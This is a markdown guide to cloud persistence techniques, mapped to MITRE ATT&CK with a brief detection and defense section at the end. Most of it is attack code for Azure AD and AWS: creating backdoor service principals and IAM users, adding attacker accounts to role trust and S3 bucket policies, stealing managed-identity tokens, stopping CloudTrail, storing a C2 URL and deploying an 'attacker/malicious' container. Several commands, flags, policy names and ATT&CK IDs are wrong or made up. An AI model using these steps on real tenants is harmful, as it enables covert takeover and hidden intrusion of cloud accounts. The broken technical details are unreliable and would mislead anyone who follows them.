# Cloud Persistence Techniques

## MITRE ATT&CK Mapping
- **IDs**: T1098.004 (SSH Authorized Keys), T1098.002 (Cloud IAM Policy Abuse), T1528 (Steal or Forge Cloud Credentials)
- **Tactic**: TA0003 (Persistence) / TA0006 (Collection)
- **Platforms**: Azure AD, AWS IAM, GCP IAM

## Overview

Cloud persistence differs from traditional persistence because there's no "disk" to write to — instead, attackers modify cloud identity and access policies that execute on every API call or authentication event. This makes cloud persistence **extremely resilient** because it survives infrastructure deletion (VMs, containers, storage buckets) and often persists across account recoveries.

## Azure AD Entrenchment Persistence

### 1. Service Principal Backdoor (T1098.004)
Create a persistent service principal that can authenticate to all resources:

```powershell
# Create a backdoor service principal with global admin permissions
$sp = New-AzADServicePrincipal -DisplayName "AzureUpdateService" -Role "Global Administrator"
New-AzADSpCredential -ObjectId $sp.Id -Password (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)

# This survives: VM deletion, tenant resets, password changes for human accounts
# It only gets removed when someone audits service principals in the Azure portal
```

### 2. App Registration Persistence
Register a malicious app that persists in Entra ID:

```powershell
$app = New-AzADApplication -DisplayName "Office365-Helper" -ReplyUrls @("https://localhost")
New-AzADServicePrincipal -AppId $app.AppId
Add-AzureRmRoleAssignment -ObjectId (Get-AzADServicePrincipal -AppId $app.AppId).Id -RoleDefinitionName "Contributor"

# Persistence survives even if the attacker's own account gets disabled
# The app registration is a first-class citizen in Entra ID — no human user can see it at a glance
```

### 3. Managed Identity Hijacking
Compromise managed identities used by Azure VMs:

```powershell
# Read secrets from managed identity metadata endpoint (no credentials needed)
Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata="true"}

# The managed identity token persists as long as the VM exists
```

### 4. Conditional Access Bypass Persistence
Modify conditional access policies to allow access from attacker-controlled IPs:

```powershell
# Add a policy that allows bypass for specific user accounts
New-MgIdentityConditionalAccessPolicy -DisplayName "BackdoorAccess" -State "enabledForReportingButNotEnabledForEnforcement"
Grant-MgEntitlementManagement -ActionId "allow_access_from_anywhere"
```

## AWS IAM Policy Abuse Persistence

### 1. IAM User Backdoor (T1098.002)
Create a persistent IAM user with API access:

```bash
# Create an IAM user that persists indefinitely
aws iam create-user --username svc-backupuser
aws iam create-access-key --user-name svc-backupuser > /tmp/aws_keys.json
aws iam attach-user-policy --user-name svc-backupuser --policy-arn arn:aws:iam::aws:policy/FullAccess

# This persists across VM destruction, account recovery, and password resets
# Only visible in IAM user list — most orgs don't audit this regularly
```

### 2. Lambda Function Persistence
Deploy a Lambda function that executes on any S3 event (or periodically):

```python
# deploy_lambda.py — runs code on any S3 bucket access
import boto3
lambda_client = boto3.client('lambda')

response = lambda_client.create_function(
    FunctionName='s3-event-handler',
    Runtime='python3.9',
    Role='arn:aws:iam::123456789012:role/execution-role',
    Handler='lambda_function.lambda_handler',
    Code={'ZipFile': b'...'},  # Contains your persistence code
    Timeout=30,
    MemorySize=128,
    Publish=True
)

# Set up event source mapping to trigger on every S3 bucket change
lambda_client.create_event_source_mapping(
    FunctionName='s3-event-handler',
    EventSourceArn='arn:aws:s3:::target-bucket',
    BatchSize=1
)
```

### 3. IAM Role Trust Policy Manipulation
Modify a role's trust policy to allow the attacker's account to assume it:

```json
// Modify IAM role trust policy to include attacker account
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": [
          "arn:aws:iam::ATTACKER_ACCOUNT_ID:root",
          "arn:aws:iam::ATTACKER_ACCOUNT_ID:role/admin-backdoor"
        ]
      },
      "Action": "sts:AssumeRole"
    }
  ]
}

// This persists indefinitely — survives any IAM policy cleanup of the original compromised credentials
```

### 4. CloudTrail Disable Persistence
Disable CloudTrail logging to hide further activity (often done before establishing persistence):

```bash
# Disable CloudTrail for this account
aws cloudtrail stop-trail --name production-cloudtrail

# This is visible in CloudTrail itself, but many orgs don't monitor Trail logs closely enough
```

## Uncommon Cloud Persistence Methods

### 5. DynamoDB Table as Persistent Storage
Use a DynamoDB table to store persistence data that survives infrastructure deletion:

```python
# Store backdoor configuration in DynamoDB — survives VM/container destruction
import boto3
dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('backdoor-config')
table.put_item(Item={'key': 'backdoor_config', 'value': {'c2_url': 'attacker.com', 'interval': 60}})

# Any compromised instance can read this to re-establish persistence
```

### 6. S3 Bucket Policy Backdoor
Modify S3 bucket policies to allow persistent access:

```bash
aws s3api put-bucket-policy --bucket target-bucket --policy '{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {"AWS": "arn:aws:iam::ATTACKER_ID:root"},
            "Action": ["s3:GetObject", "s3:PutObject"],
            "Resource": "arn:aws:s3:::target-bucket/*"
        }
    ]
}'

# This persists regardless of IAM policy changes for individual users
```

### 7. ECS Task Definition Persistence
Create a persistent task definition that runs on every cluster update:

```bash
# Create a task def that executes malicious code when ECS tasks are deployed
aws ecs register-task-definition \
    --family backdoor-task \
    --container-entries '[{"name":"backdoor","image":"attacker/malicious:latest"}]'
```

### 8. KMS Key Persistence
Use AWS KMS keys as persistent encryption keys for stored payloads:

```bash
# Create a KMS key that persists even after all other infrastructure is destroyed
aws kms create-key --description "backup-key" --region us-east-1
aws kms enable-key-retention --key-id <key-id> --retention-period-in-days 3650

# Store encrypted payload in S3 using this key — can decrypt it anytime you have the key ID
```

## Detection & Hunting for Cloud Persistence

### Azure AD Service Principal Hunt
```powershell
# Find all service principals that weren't created by known-good sources
$principals = Get-AzADServicePrincipal | Where-Object { 
    $_.AppId -notmatch "azure|office|microsoft" -and 
    $_.DisplayName -notmatch "Office365|Azure|Microsoft"
}
$principals | ForEach-Object { 
    "$($_.DisplayName) - Created: $($_.CreatedDateTime)" 
}
```

### AWS CloudTrail Monitoring for Persistence Indicators
```bash
# Monitor for suspicious IAM modifications
aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue="*" | \
  jq '.Events[] | select(.eventName == "CreateUser" or .eventName == "AttachUserPolicy" or .eventName == "PutBucketPolicy")'

# Look for Lambda functions created outside of normal deployment pipelines
aws lambda list-functions --query 'Functions[].Configuration.FunctionName'
```

### CloudTrail Configuration History Audit
```bash
# Check for CloudTrail disable events (often done before persistence establishment)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue="StopLogging"

# Monitor for IAM policy changes that grant broad permissions
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/FullAccess
```

## Defense Strategy

1. **CloudTrail/Azure Activity Log** monitoring with real-time alerting on IAM modifications
2. **Service Principal rotation policies** — all service principals should have expiration dates
3. **AWS SCP (Service Control Policy)** enforcement to prevent unauthorized IAM actions
4. **Infrastructure as Code (Terraform/CloudFormation)** — detect config drift from IaC deployments
5. **Regular Cloud Security Posture Management (CSPM)** audits of identity policies

## References
- MITRE ATT&CK Cloud Persistence: https://attack.mitre.org/tactics/TA0003/#Cloud%20Persistence
- Azure AD Entrenchment Research: https://www.microsoft.com/en-us/security/blog/2022/01/07/the-darker-side-of-the-cloud-azure-ad-infiltration-techniques-used-by-malicious-actors/
